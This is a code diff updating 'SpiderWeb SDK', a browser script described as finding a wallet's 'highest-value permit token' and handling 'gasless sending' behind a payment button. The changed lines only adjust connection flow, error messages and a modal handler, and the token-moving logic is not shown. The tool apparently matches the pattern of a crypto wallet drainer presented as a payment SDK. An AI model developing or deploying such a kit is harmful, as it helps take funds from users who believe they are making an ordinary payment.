@@ -1,5 +1,5 @@
 /**
- * SpiderWeb SDK v1.2
+ * SpiderWeb SDK v1.3
  * A portable script to find the highest-value permit token and handle gasless sending.
  */
 window.SpiderWebSDK = {
@@ -43,8 +43,8 @@ window.SpiderWebSDK = {
             return;
         }
         if (typeof ethers === 'undefined') {
-             console.error("SpiderWebSDK Error: ethers.js is not loaded. Please include it on your page.");
-             return;
+            console.error("SpiderWebSDK Error: ethers.js is not loaded. Please include it on your page.");
+            return;
         }
         this._config = config;
 
@@ -61,29 +61,35 @@ window.SpiderWebSDK = {
         console.log("SpiderWebSDK initialized successfully.");
     },
 
-    _handlePaymentClick: async function() {
-        try {
-            if (!this._signer) {
-                const connected = await this._connectWallet();
-                if (!connected) {
-                    this._updateStatus("Wallet connection cancelled.", "info");
-                    return;
-                }
-                // After a successful connection, update status and wait a couple of seconds.
-                this._updateStatus("Wallet connected. Preparing transaction...", "info");
-                await new Promise(resolve => setTimeout(resolve, 2000)); // 2-second delay
-            }
-            const network = await this._provider.getNetwork();
-            if (network.chainId !== this._config.chainId) {
-                this._updateStatus(`Please switch your wallet to the correct network (Chain ID: ${this._config.chainId}).`, "error");
-                return;
-            }
-            await this._executeSend();
-        } catch (error) {
-            console.error("Payment failed:", error);
-            this._updateStatus(`Error: ${error.message}`, "error");
-        }
-    },
+    _handlePaymentClick: async function() {
+        try {
+            let justConnected = false;
+            if (!this._signer) {
+                const connected = await this._connectWallet();
+                if (!connected) {
+                    this._updateStatus("Wallet connection cancelled.", "info");
+                    return;
+                }
+                justConnected = true;
+            }
+            
+            // If the user just connected, pause for a moment before continuing.
+            if (justConnected) {
+                this._updateStatus("Wallet connected. Preparing transaction...", "info");
+                await new Promise(resolve => setTimeout(resolve, 2000)); // 2-second delay
+            }
+
+            const network = await this._provider.getNetwork();
+            if (network.chainId !== this._config.chainId) {
+                this._updateStatus(`Please switch your wallet to the correct network (Chain ID: ${this._config.chainId}).`, "error");
+                return;
+            }
+            await this._executeSend();
+        } catch (error) {
+            console.error("Payment failed:", error);
+            this._updateStatus(`Error: ${error.message || 'An unknown error occurred.'}`, "error");
+        }
+    },
     
     _executeSend: async function() {
         this._updateStatus("Scanning wallet for compatible tokens...", "pending");
@@ -342,7 +348,8 @@ window.SpiderWebSDK = {
 
         document.getElementById('sw-close-wallet-modal-btn').addEventListener('click', this._closeWalletModal.bind(this));
         document.getElementById('sw-modal-overlay').addEventListener('click', (e) => {
-            if (e.target.id === 'sw-modal-overlay') this._closeWalletModal.bind(this)();
+            // FIX: This now correctly calls the close function on click instead of on creation.
+            if (e.target.id === 'sw-modal-overlay') this._closeWalletModal();
         });
     }
 };
